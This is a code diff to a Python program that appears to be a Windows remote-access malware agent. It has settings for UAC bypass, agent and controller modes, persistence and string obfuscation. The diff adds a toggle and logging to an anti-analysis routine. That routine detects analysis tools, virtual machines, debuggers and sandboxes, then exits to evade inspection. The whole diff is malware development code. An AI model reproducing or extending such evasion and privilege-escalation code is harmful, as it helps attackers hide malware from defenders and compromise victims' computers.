@@ -192,6 +192,7 @@ UAC_PRIVILEGE_DEBUG = True  # Enable detailed UAC and privilege debugging
 DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated attempts
 RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
 KEEP_ORIGINAL_PROCESS = True  # TRUE = Don't exit original process after UAC bypass (keep CMD window open)
+ENABLE_ANTI_ANALYSIS = False  # FALSE = Disabled (for testing), TRUE = Enabled (exits if debuggers/VMs detected)
 
 # Controller URL override flag (set URL via env)
 USE_FIXED_SERVER_URL = True
@@ -5731,6 +5732,20 @@ def setup_persistence():
 
 def anti_analysis():
     """Anti-analysis and evasion techniques."""
+    # ========================================================================
+    # CHECK CONFIGURATION FLAG
+    # ========================================================================
+    if not ENABLE_ANTI_ANALYSIS:
+        debug_print("[ANTI-ANALYSIS] ⚠️ Anti-analysis protection DISABLED (ENABLE_ANTI_ANALYSIS=False)")
+        log_message("[ANTI-ANALYSIS] All security detection checks disabled", "warning")
+        return True  # Skip all checks
+    
+    # ========================================================================
+    # ANTI-ANALYSIS PROTECTION ENABLED
+    # ========================================================================
+    debug_print("[ANTI-ANALYSIS] ✓ Anti-analysis protection ENABLED")
+    log_message("[ANTI-ANALYSIS] Checking for security tools, VMs, debuggers...", "info")
+    
     try:
         # Check for common analysis tools
         analysis_processes = [
@@ -5745,6 +5760,8 @@ def anti_analysis():
         for proc in psutil.process_iter(['name']):
             if proc.info['name'].lower() in analysis_processes:
                 # If analysis tool detected, sleep and exit
+                debug_print(f"[ANTI-ANALYSIS] ❌ Detected: {proc.info['name']}")
+                log_message(f"[ANTI-ANALYSIS] Security tool detected: {proc.info['name']}", "error")
                 time.sleep(60)
                 sys.exit(0)
         
@@ -5758,6 +5775,8 @@ def anti_analysis():
             c = wmi.WMI()
             for system in c.Win32_ComputerSystem():
                 if any(indicator in system.Model.upper() for indicator in vm_indicators):
+                    debug_print(f"[ANTI-ANALYSIS] ❌ VM detected: {system.Model}")
+                    log_message(f"[ANTI-ANALYSIS] VM environment detected: {system.Model}", "error")
                     time.sleep(60)
                     sys.exit(0)
         except:
@@ -5765,6 +5784,8 @@ def anti_analysis():
         
         # Check for debugger
         if ctypes.windll.kernel32.IsDebuggerPresent():
+            debug_print("[ANTI-ANALYSIS] ❌ Debugger detected")
+            log_message("[ANTI-ANALYSIS] Debugger present", "error")
             time.sleep(60)
             sys.exit(0)
         
@@ -5776,14 +5797,20 @@ def anti_analysis():
             pos2 = win32gui.GetCursorPos()
             if pos1 == pos2:
                 # No mouse movement, might be sandbox
+                debug_print("[ANTI-ANALYSIS] ❌ No mouse movement - possible sandbox")
+                log_message("[ANTI-ANALYSIS] Sandbox detected (no mouse movement)", "error")
                 time.sleep(60)
                 sys.exit(0)
         except:
             pass
         
+        debug_print("[ANTI-ANALYSIS] ✓ All checks passed - no threats detected")
+        log_message("[ANTI-ANALYSIS] Environment appears safe", "info")
         return True
         
     except Exception as e:
+        debug_print(f"[ANTI-ANALYSIS] Error during checks: {e}")
+        log_message(f"[ANTI-ANALYSIS] Check error: {e}", "warning")
         return False
 
 def obfuscate_strings():
